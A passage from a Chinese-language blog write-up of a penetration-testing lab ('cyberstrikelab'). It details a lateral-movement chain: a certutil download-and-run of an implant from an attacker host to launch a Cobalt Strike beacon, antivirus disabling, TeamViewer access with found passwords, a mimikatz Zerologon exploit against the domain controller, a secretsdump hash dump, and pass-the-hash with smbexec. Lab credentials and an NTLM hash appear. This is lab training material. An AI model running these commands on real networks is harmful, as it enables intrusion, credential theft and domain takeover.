	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204121327102_hu17135091136840655214.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204121327102_hu11833671398344637479.png 1024w"
	loading="lazy"
	
		alt="image-20260204121327102"
	
	
		class="gallery-image" 
		data-flex-grow="310"
		data-flex-basis="745px"
	
></p>
<p>看来又是一个多级代理的靶场</p>
<p>搭建之后去看看<code>172.10.68.30:8088</code></p>
<p>是一个用友的站点</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204122538573.png"
	width="796"
	height="826"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204122538573_hu6203694178705860585.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204122538573_hu10715512566400219542.png 1024w"
	loading="lazy"
	
		alt="image-20260204122538573"
	
	
		class="gallery-image" 
		data-flex-grow="96"
		data-flex-basis="231px"
	
></p>
<p>直接开<code>suo</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204123755236.png"
	width="1805"
	height="1067"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204123755236_hu15391929139946375945.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204123755236_hu13898479271689931211.png 1024w"
	loading="lazy"
	
		alt="image-20260204123755236"
	
	
		class="gallery-image" 
		data-flex-grow="169"
		data-flex-basis="405px"
	
></p>
<p>可以直接读flag，这里照常先上线CS再读</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certutil -urlcache -split -f http://172.10.68.20/4444.exe
</span></span><span class="line"><span class="cl">4444.exe http://172.10.68.20/4444.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204125156895.png"
	width="827"
	height="409"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204125156895_hu4407674966559086510.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204125156895_hu12439769225961603456.png 1024w"
	loading="lazy"
	
		alt="image-20260204125156895"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="485px"
	
></p>
<h3 id="flag3-10">flag3
</h3><h4 id="知识点teamviewr连接">知识点：<code>teamviewr</code>连接
</h4><p>额，第二台机子估计有杀软，网络分离的免杀也只能坚持一会，这里反正是管理员权限，直接就搞一个RDP上去，关闭杀软</p>
<p>扫描内网</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204125236529.png"
	width="903"
	height="406"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204125236529_hu8992368349053984909.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260204125236529_hu4949042329728414232.png 1024w"
	loading="lazy"
	
		alt="image-20260204125236529"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="533px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">10.0.0.59
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205205740380.png"
	width="412"
	height="97"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205205740380_hu16109451260142939631.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205205740380_hu14895143730400765639.png 1024w"
	loading="lazy"
	
		alt="image-20260205205740380"
	
	
		class="gallery-image" 
		data-flex-grow="424"
		data-flex-basis="1019px"
	
></p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>ip</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>10.0.0.59</td>
<td>外网靶机（已拿下）</td>
</tr>
<tr>
<td>10.0.0.58</td>
<td>WIN-KNETOKJEB7S</td>
</tr>
<tr>
<td>10.0.0.60</td>
<td>DC域控</td>
</tr>
<tr>
<td>10.0.0.61</td>
<td>cyberweb</td>
</tr>
</tbody>
</table></div>
<p>看下来没有web服务</p>
<p>之前RDP关杀软的时候看到了桌面有个<code>teamviewer</code></p>
<p>在管理员的桌面可以看到密码</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205211019188.png"
	width="869"
	height="405"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205211019188_hu6143277763815736268.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205211019188_hu18035698091122193046.png 1024w"
	loading="lazy"
	
		alt="image-20260205211019188"
	
	
		class="gallery-image" 
		data-flex-grow="214"
		data-flex-basis="514px"
	
></p>
<p>将内网ip尝试输入后发现10.0.0.58可以连接 tm@cslab为teamviewer密码，24d@cs1为该主机administrator密码。直接连上，读取flag即可</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205211424074.png"
	width="1268"
	height="832"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205211424074_hu149126016434607562.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205211424074_hu8982680155866342655.png 1024w"
	loading="lazy"
	
		alt="image-20260205211424074"
	
	
		class="gallery-image" 
		data-flex-grow="152"
		data-flex-basis="365px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205211803700.png"
	width="1733"
	height="1013"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205211803700_hu11298929817465335496.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205211803700_hu8148645534098658535.png 1024w"
	loading="lazy"
	
		alt="image-20260205211803700"
	
	
		class="gallery-image" 
		data-flex-grow="171"
		data-flex-basis="410px"
	
></p>
<h3 id="flag4-2">flag4
</h3><h4 id="知识点zerologon">知识点：zerologon
</h4><p>既然直接有RDP了，那就关一下杀软直接上线CS</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205212354730.png"
	width="1004"
	height="466"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205212354730_hu11821238476554341422.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205212354730_hu10004901903503122463.png 1024w"
	loading="lazy"
	
		alt="image-20260205212354730"
	
	
		class="gallery-image" 
		data-flex-grow="215"
		data-flex-basis="517px"
	
></p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>ip</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr>
<td>10.0.0.59</td>
<td>外网靶机（已拿下）</td>
</tr>
<tr>
<td>10.0.0.58</td>
<td>WIN-KNETOKJEB7S （拿下）</td>
</tr>
<tr>
<td>10.0.0.60</td>
<td>DC域控</td>
</tr>
<tr>
<td>10.0.0.61</td>
<td>cyberweb</td>
</tr>
</tbody>
</table></div>
<p><code>systeminfo</code>看一下，发现和域控并不是一个域的</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205212639484.png"
	width="742"
	height="483"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205212639484_hu3358837934108078397.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205212639484_hu366113431335491682.png 1024w"
	loading="lazy"
	
		alt="image-20260205212639484"
	
	
		class="gallery-image" 
		data-flex-grow="153"
		data-flex-basis="368px"
	
></p>
<p>那我们直接再找找看</p>
<p>此时连一个域账号也没有，正常来说从域外进入域内有这么几种思路：<code>Ldap匿名访问；域用户枚举；CVE漏洞利用</code>等手段。</p>
<p>后来发现<code>zerologon</code>可以用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell C:\Users\Public\mimikatz.exe &#34;privilege::debug &#34; &#34;lsadump::zerologon /target:10.0.0.60 /account:DC$&#34; &#34;exit&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205213605549.png"
	width="664"
	height="691"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205213605549_hu6424224012130298478.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205213605549_hu15745879873829355029.png 1024w"
	loading="lazy"
	
		alt="image-20260205213605549"
	
	
		class="gallery-image" 
		data-flex-grow="96"
		data-flex-basis="230px"
	
></p>
<p>置空密码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell C:\Users\Public\mimikatz.exe &#34;privilege::debug &#34; &#34;lsadump::zerologon /target:10.0.0.60  /ntlm /null /account:DC$ /exploit&#34; &#34;exit&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205213716905.png"
	width="690"
	height="536"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205213716905_hu17526707316916681672.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205213716905_hu12231522681183704007.png 1024w"
	loading="lazy"
	
		alt="image-20260205213716905"
	
	
		class="gallery-image" 
		data-flex-grow="128"
		data-flex-basis="308px"
	
></p>
<p>最后导出哈希，打PTH就行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains python secretsdump.py -no-pass cyberstrikelab.com/DC\$@10.0.0.60
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205213902276.png"
	width="999"
	height="453"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205213902276_hu4115476215717409092.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205213902276_hu12635457474816740444.png 1024w"
	loading="lazy"
	
		alt="image-20260205213902276"
	
	
		class="gallery-image" 
		data-flex-grow="220"
		data-flex-basis="529px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">7b50525da0ea9349b4c698bbe4868544
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 python3 smbexec.py -hashes :7b50525da0ea9349b4c698bbe4868544 cyberstrikelab.com/administrator@10.0.0.60
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205214549941.png"
	width="1114"
	height="459"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205214549941_hu6630243881761796772.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205214549941_hu139482839447222389.png 1024w"
	loading="lazy"
	
		alt="image-20260205214549941"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="582px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 python3 smbexec.py -hashes :7b50525da0ea9349b4c698bbe4868544 cyberstrikelab.com/administrator@10.0.0.61
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205214736346.png"
	width="1308"
	height="516"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205214736346_hu14233331660174516271.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260205214736346_hu240493232254844194.png 1024w"
	loading="lazy"
	
		alt="image-20260205214736346"
	
	
		class="gallery-image" 
		data-flex-grow="253"
		data-flex-basis="608px"
	
></p>
<h2 id="diamond">Diamond
</h2><h3 id="flag1-14">flag1
</h3><h4 id="知识点-1">知识点：
</h4><p><code>fscan</code>一下</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260207193752507.png"
	width="1406"
	height="335"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260207193752507_hu11999616711282266840.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260207193752507_hu6354719128286931571.png 1024w"
	loading="lazy"
	
		alt="image-20260207193752507"
	
	
		class="gallery-image" 
		data-flex-grow="419"
		data-flex-basis="1007px"
	
></p>
<h3 id="flag2-13">flag2
</h3><h4 id="知识点-2">知识点：
</h4><h3 id="flag3-11">flag3
</h3><h4 id="知识点-3">知识点：
</h4><h3 id="flag4-3">flag4
</h3><h4 id="知识点-4">知识点：
</h4>
</section>


    <footer class="article-footer">
    

    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">相关文章</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/">
        
        

        <div class="article-details">
            <h2 class="article-title">春秋云镜渗透复现</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982025/">
        
        

        <div class="article-details">
            <h2 class="article-title">极客大挑战2025</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/2025%E6%B1%9F%E8%A5%BF%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%E7%9C%81%E8%B5%9B%E5%86%B3%E8%B5%9B/">
        
        

        <div class="article-details">
            <h2 class="article-title">2025江西信息技术省赛决赛</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/qctf2025/">
        
        

        <div class="article-details">
            <h2 class="article-title">qctf2025</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/newstar2025/">
        
        

        <div class="article-details">
            <h2 class="article-title">NewStar2025</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (typeof DISQUS == 'object') {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2025 - 
        
        2026 liernian
    </section>
    
    <section class="powerby">
        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
